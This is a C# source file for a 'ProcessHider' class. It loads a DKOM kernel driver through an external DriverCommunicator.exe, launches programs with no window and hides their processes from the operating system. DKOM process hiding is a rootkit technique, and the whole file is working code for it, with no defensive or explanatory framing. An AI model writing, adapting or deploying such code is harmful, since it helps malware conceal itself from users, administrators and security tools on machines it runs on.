using System;
using System.Diagnostics;
using System.IO;

namespace Manager
{
    class ProcessHider
    {
        private static string processHiderPath;
        private static bool isActive;

        #region Initiallization

        public ProcessHider()
        {
            if (ProcessHider.isActive)
                return;
            processHiderPath = Directory.GetCurrentDirectory() + "\\DriverCommunicator.exe";
            ProcessHider.isActive = InitDriver();
        }

        /// <summary>
        ///  initializes the dkom driver
        /// </summary>
        /// <returns> true if succeeded </returns>
        private bool InitDriver()
        {
            if (System.Environment.Is64BitOperatingSystem || ProcessHider.isActive)
                return true;
            Process p = StartVisibleProcess(processHiderPath, "load");
            if (p == null)
                throw new Exception("driver communicator not in current directory");
            p.WaitForExit();
            return p.ExitCode == 0;
        }

        #endregion

        #region Public

        /// <summary>
        /// hides a process using DKOM
        /// </summary>
        /// <param name="p"> process object </param>
        /// <returns> boolean value that indicates if the operation succeeded </returns>
        public bool HideProc(Process p)
        {
            return HideProc(p.Id);
        }

        /// <summary>
        /// hides a process using DKOM
        /// </summary>
        /// <param name="pId"> process id </param>
        /// <returns> boolean value that indicates if the operation succeeded </returns>
        public bool HideProc(int pId)
        {
            if (!ProcessHider.isActive)
                return false;
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(processHiderPath, "hide " + pId);
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            if (!p.Start())
                return false;
            p.WaitForExit();
            if (p.ExitCode != 0) // fail
                return false;
            return true;
        }

        /// <summary>
        /// starts a new process
        /// </summary>
        /// <param name="path"> path to exectuable (not certainly an .exe file)  file </param>
        /// <param name="args"> command arguments </param>
        /// <returns></returns>
        public Process StartVisibleProcess(string path, string args)
        {
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(path, args);
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.CreateNoWindow = true;
            p.EnableRaisingEvents = true;
            if (!p.Start())
                return null;
            p.StandardInput.AutoFlush = true;
            return p;
        }

        /// <summary>
        /// starts a new process
        /// </summary>
        /// <param name="path"> path to exectuable (not certainly an .exe file)  file </param>
        /// <param name="args"> command arguments </param>
        /// <param name="outputHandler"> program output event handler </param>
        /// <returns></returns>
        public Process StartVisibleProcess(string path, string args, DataReceivedEventHandler outputHandler)
        {
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(path, args);
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.CreateNoWindow = true;
            p.EnableRaisingEvents = true;
            p.OutputDataReceived += outputHandler;
            p.ErrorDataReceived += outputHandler;
            p.Exited += new EventHandler(OnEventedProcessExit);
            if (!p.Start())
                return null;
            p.StandardInput.AutoFlush = true;
            p.BeginOutputReadLine(); // to enable the output redirection event
            p.BeginErrorReadLine();
            return p;
        }

        /// <summary>
        /// starting and hiding the process
        /// </summary>
        /// <param name="path"> file path (or command) </param>
        /// <param name="args"> process arguments </param>
        /// <returns> a process object, if it fails then it retuens null </returns>
        public Process StartHiddenProcess(string path, string args)
        {
            Process p = this.StartVisibleProcess(path, args);
            if (p == null)
                return null;
            if (!this.HideProc(p))
            {
                p.Kill();
                return null;
            }
            return p;
        }

        /// <summary>
        /// starting and hiding the process
        /// </summary>
        /// <param name="path"> file path (or command) </param>
        /// <param name="args"> process arguments </param>
        /// <param name="outputHandler"> the program output event handler </param>
        /// <returns> a process object, if it fails then it retuens null </returns>
        public Process StartHiddenProcess(string path, string args, DataReceivedEventHandler outputHandler)
        {
            Process p = this.StartVisibleProcess(path, args, outputHandler);
            if (p == null)
                return null;
            if (!this.HideProc(p))
            {
                p.Kill();
                return null;
            }
            return p;
        }

        #endregion

        /// <summary>
        /// process that started with output handler has exited
        /// </summary>
        /// <param name="sender"> the process obj </param>
        /// <param name="e"> event args </param>
        private void OnEventedProcessExit(object sender, EventArgs e)
        {
            ((Process)sender).CancelOutputRead(); // stop reading output
            ((Process)sender).CancelErrorRead();
        }
    }
}
